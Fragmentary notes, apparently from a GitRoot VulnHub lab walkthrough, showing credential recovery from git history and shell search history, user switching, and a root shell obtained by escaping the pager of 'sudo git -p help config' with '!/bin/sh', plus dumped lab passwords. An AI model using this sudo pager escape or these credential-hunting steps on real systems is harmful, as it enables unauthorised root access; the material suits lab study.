参考 [h](https://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/)ttps://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/
   

教程  
pablo_S3cret_P@ss  
beth_S3cret_P@ss  
jen_S3cret_P@ss
    
diyige  
901e737420667137fca550889be2162c
   

baopo
   

b2ab5f540baab4c299306e16f077d7a6f6556ca3 06fbefc1da56b8d552cfa299924097ba1213dd93 Your Name \<you@example.com\> 1590500148 -0400 commit: added some stuff
      

pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ cat -n * | grep "Your Name" | grep "some stuff"  
414 b2ab5f540baab4c299306e16f077d7a6f6556ca3 06fbefc1da56b8d552cfa299924097ba1213dd93 Your Name \<you@example.com\> 1590500148 -0400 commit: added some stuff  
pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ git show 06fbefc1da56b8d552cfa299924097ba1213dd93  
commit 06fbefc1da56b8d552cfa299924097ba1213dd93  
Author: Your Name \<you@example.com\>  
Date: Tue May 26 09:35:48 2020 -0400
 
added some stuff
 
diff --git a/main.c b/main.c  
index 70e6397..8af9b9c 100644  
--- a/main.c  
+++ b/main.c  
@@ -4,6 +4,15 @@  
int main(){   char pass[20];  
- return 0;  
- scanf("%20s", pass);  
- printf("You put %s\n", pass);  
- if (strcmp(pass, "r3vpdmspqdb") == 0 ){  
- char *cmd[] = { "bash", (char *)0 };  
- execve("/bin/bash", cmd, (char *) 0);  
- }  
- else{  
- puts("BAD PASSWORD");  
- }  
- return 0;  
}  
-//43  
-  
pablo@GitRoot:/opt/auth/.git/logs/refs/heads$
   

su beth  
r3vpdmspqdb
 
shell  
# Search String History (newest to oldest):  
?/binzpbeocnexoe  
|2,1,1590471908,47,"binzpbeocnexoe"
      

jen  
binzpbeocnexoe
 
jen@GitRoot:/home/pablo$ sudo git -p help config  
GIT-CONFIG(1) Git Manual GIT-CONFIG(1)
 
NAME  
git-config - Get and set repository or global options
 
SYNOPSIS  
git config [\<file-option\>] [--type=\<type\>] [--show-origin] [-z|--null] name [value [value_regex]]  
git config [\<file-option\>] [--type=\<type\>] --add name value  
git config [\<file-option\>] [--type=\<type\>] --replace-all name value [value_regex]  
git config [\<file-option\>] [--type=\<type\>] [--show-origin] [-z|--null] --get name [value_regex]  
git config [\<file-option\>] [--type=\<type\>] [--show-origin] [-z|--null] --get-all name [value_regex]  
git config [\<file-option\>] [--type=\<type\>] [--show-origin] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]  
git config [\<file-option\>] [--type=\<type\>] [-z|--null] --get-urlmatch name URL  
git config [\<file-option\>] --unset name [value_regex]  
git config [\<file-option\>] --unset-all name [value_regex]  
git config [\<file-option\>] --rename-section old_name new_name  
git config [\<file-option\>] --remove-section name  
git config [\<file-option\>] [--show-origin] [-z|--null] [--name-only] -l | --list  
git config [\<file-option\>] --get-color name [default]  
git config [\<file-option\>] --get-colorbool name [stdout-is-tty]  
git config [\<file-option\>] -e | --edit
 
DESCRIPTION  
You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the value will be escaped.
 
Multiple lines can be added to an option by using the --add option. If you want to update or unset an option which can occur on multiple lines, a POSIX regexp  
value_regex needs to be given. Only the existing values that match the regexp are updated or unset. If you want to handle the lines that do not match the regex, just  
prepend a single exclamation mark in front (see also the section called “EXAMPLES”).
 
The --type=\<type\> option instructs git config to ensure that incoming and outgoing values are canonicalize-able under the given \<type\>. If no --type=\<type\> is given, no  
canonicalization will be performed. Callers may unset an existing --type specifier with --no-type.
 
When reading, the values are read from the system, global and repository local configuration files by default, and options --system, --global, --local, --worktree and  
--file \<filename\> can be used to tell the command to read from only that location (see the section called “FILES”).  
!/bin/sh  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root  
# ls  
proof.txt root.txt setpasswords.php  
# cat proof.txt  
00eee7e3bee61c8033bdfbf15cedcab0  
# cat root.txt  
Your flag is in another file...  
# cat setpasswords.php  
\<?php  
$pabloKey = "pablo_S3cret_P@ss";  
$bethKey = "beth_S3cret_P@ss";  
$jenKey = "jen_S3cret_P@ss";  
$pabloValue = "9ebc63a534f8a854941bbbabdf92325fcd2d2e29";  
$bethValue = "c6ded2c7fc7281cefb3a2373005d91eb1f32830e";  
$jenValue = "6930002a9efc93e8bce7bfc48fb09320eb154e4b";  
$gitmem = new Memcached();  
$gitmem-\>setOption(Memcached::OPT_BINARY_PROTOCOL, true);  
$gitmem-\>setSaslAuthData("pablo@gitroot", "ihjedpvqfe");  
$gitmem-\>addServer("127.0.0.1", 11211);  
$gitmem-\>set($pabloKey, $pabloValue);  
$gitmem-\>set($bethKey, $bethValue);  
$gitmem-\>set($jenKey, $jenValue);  
?\>  
#